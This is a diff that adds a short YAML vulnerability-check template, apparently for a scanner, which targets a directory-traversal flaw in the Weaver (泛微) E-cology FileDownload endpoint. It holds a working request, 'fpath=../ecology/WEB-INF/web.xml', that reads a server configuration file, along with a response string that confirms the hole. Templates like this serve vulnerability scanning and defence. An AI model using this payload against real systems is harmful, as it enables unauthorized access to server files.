@@ -1,0 +1,18 @@
+id:
+
+info:
+  name: 泛微E-cology filedownload文件目录遍历
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml
+  headers:
+response1:
+  headers:
+  body: CompressingFilter
+  code:
+requests2:
+response2:
